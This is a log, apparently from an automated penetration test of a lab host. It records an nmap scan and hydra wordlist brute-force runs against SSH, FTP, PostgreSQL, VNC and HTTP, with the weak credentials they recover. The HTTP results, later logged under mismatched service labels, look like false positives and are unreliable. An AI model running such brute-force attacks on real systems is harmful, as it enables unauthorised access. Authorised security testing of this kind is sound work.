{"credentials":[],"endpoints":["10.62.34.10:22/ssh","10.62.34.10:53/tcpwrapped","10.62.34.10:80/http","10.62.34.10:212/ftp","10.62.34.10:700/http","10.62.34.10:901/vnc","10.62.34.10:5432/postgresql"],"services":["OpenSSH 8.9p1 Ubuntu 3ubuntu0.13:22","nginx 1.18.0 (Ubuntu):80","vsftpd 2.3.4:212","Gunicorn:700","VNC (protocol 3.8):901","PostgreSQL DB 9.6.0 or later:5432"],"cookies":[],"vulnerabilities":[]}{"command": "nmap -sV -T4 --top-ports=1000 10.62.34.10", "result": "Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-30 18:47 UTC
Nmap scan report for 10.62.34.10
Host is up (0.012s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
212/tcp  open  ftp        vsftpd 2.3.4
700/tcp  open  http       Gunicorn
901/tcp  open  vnc        VNC (protocol 3.8)
5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
"}{"credentials":[{"type":"password","login":"admin","password":"protect","context":"ssh://10.62.34.10:22/"},{"type":"password","login":"uftp","password":"clock","context":"ssh://10.62.34.10:22/"}],"endpoints":["10.62.34.10:22/"],"services":[],"cookies":[],"vulnerabilities":[]}{"command": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.62.34.10", "result": "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-30 18:47:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 190 login tries (l:5/p:38), ~12 tries per task
[DATA] attacking ssh://10.62.34.10:22/
[22][ssh] host: 10.62.34.10   login: admin   password: protect
[22][ssh] host: 10.62.34.10   login: uftp   password: clock
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-30 18:48:15
"}{"credentials":[{"type":"password","login":"admin","password":"protect","context":""},{"type":"password","login":"uftp","password":"clock","context":""}],"endpoints":["10.62.34.10:212"],"services":[],"cookies":[],"vulnerabilities":[]}{"command": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.62.34.10:212", "result": "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-30 18:48:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 190 login tries (l:5/p:38), ~12 tries per task
[DATA] attacking ftp://10.62.34.10:212/
[212][ftp] host: 10.62.34.10   login: admin   password: protect
[212][ftp] host: 10.62.34.10   login: uftp   password: clock
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-30 18:48:46
"}{"credentials":[],"endpoints":[],"services":[],"cookies":[],"vulnerabilities":[]}{"command": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt pgsql://10.62.34.10:5432", "result": "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-30 18:49:06
"}{"credentials":[],"endpoints":["10.62.34.10:5432"],"services":[],"cookies":[],"vulnerabilities":[]}{"command": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt postgres://10.62.34.10:5432", "result": "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-30 18:49:10
[DATA] max 16 tasks per 1 server, overall 16 tasks, 190 login tries (l:5/p:38), ~12 tries per task
[DATA] attacking postgres://10.62.34.10:5432/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-30 18:49:12
"}{"credentials":[],"endpoints":["10.62.34.10:901"],"services":[],"cookies":[],"vulnerabilities":[]}{"command": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt rdp://10.62.34.10:901", "result": "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-30 18:49:16
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 190 login tries (l:5/p:38), ~48 tries per task
[DATA] attacking rdp://10.62.34.10:901/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 112 to do in 00:02h, 2 active
[STATUS] 78.00 tries/min, 156 tries in 00:02h, 36 to do in 00:01h, 2 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-30 18:51:45
"}{"credentials":[{"type":"password","login":"admin","password":"protect","context":""},{"type":"password","login":"admin","password":"666","context":""},{"type":"password","login":"admin","password":"clock","context":""},{"type":"password","login":"admin","password":"123456","context":""},{"type":"password","login":"user","password":"protect","context":""},{"type":"password","login":"user","password":"666","context":""},{"type":"password","login":"user","password":"clock","context":""},{"type":"password","login":"user","password":"123456","context":""},{"type":"password","login":"uftp","password":"protect","context":""},{"type":"password","login":"uftp","password":"666","context":""},{"type":"password","login":"uftp","password":"clock","context":""},{"type":"password","login":"uftp","password":"123456","context":""},{"type":"password","login":"usmb","password":"protect","context":""},{"type":"password","login":"usmb","password":"clock","context":""},{"type":"password","login":"usmb","password":"666","context":""},{"type":"password","login":"usmb","password":"123456","context":""}],"endpoints":["10.62.34.10:80"],"services":[],"cookies":[],"vulnerabilities":[]}{"command": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -w 30 http-get://10.62.34.10:80", "result": "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-30 18:52:25
[DATA] max 4 tasks per 1 server, overall 4 tasks, 190 login tries (l:5/p:38), ~48 tries per task
[DATA] attacking http-get://10.62.34.10:80/
[80][http-get] host: 10.62.34.10   login: admin   password: protect
[80][http-get] host: 10.62.34.10   login: admin   password: 666
[80][http-get] host: 10.62.34.10   login: admin   password: clock
[80][http-get] host: 10.62.34.10   login: admin   password: 123456
[80][http-get] host: 10.62.34.10   login: user   password: protect
[80][http-get] host: 10.62.34.10   login: user   password: 666
[80][http-get] host: 10.62.34.10   login: user   password: clock
[80][http-get] host: 10.62.34.10   login: user   password: 123456
[80][http-get] host: 10.62.34.10   login: uftp   password: protect
[80][http-get] host: 10.62.34.10   login: uftp   password: 666
[80][http-get] host: 10.62.34.10   login: uftp   password: clock
[80][http-get] host: 10.62.34.10   login: uftp   password: 123456
[80][http-get] host: 10.62.34.10   login: usmb   password: protect
[80][http-get] host: 10.62.34.10   login: usmb   password: clock
[80][http-get] host: 10.62.34.10   login: usmb   password: 666
[80][http-get] host: 10.62.34.10   login: usmb   password: 123456
1 of 1 target successfully completed, 54 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-30 18:52:38
"}{"credentials":[{"type":"password","login":"admin","password":"666","context":"usmb"},{"type":"password","login":"admin","password":"protect","context":"ssh"},{"type":"password","login":"admin","password":"clock","context":"ftp"},{"type":"password","login":"user","password":"protect","context":"ssh"},{"type":"password","login":"user","password":"666","context":""},{"type":"password","login":"user","password":"clock","context":""},{"type":"password","login":"user","password":"123456","context":""},{"type":"password","login":"uftp","password":"protect","context":""},{"type":"password","login":"uftp","password":"666","context":""},{"type":"password","login":"uftp","password":"clock","context":""},{"type":"password","login":"usmb","password":"protect","context":""},{"type":"password","login":"usmb","password":"666","context":""},{"type":"password","login":"usmb","password":"clock","context":""},{"type":"password","login":"uftp","password":"123456","context":""}],"endpoints":["10.62.34.10:700"],"services":[],"cookies":[],"vulnerabilities":[]}{"command": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -w 30 http-get://10.62.34.10:700", "result": "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
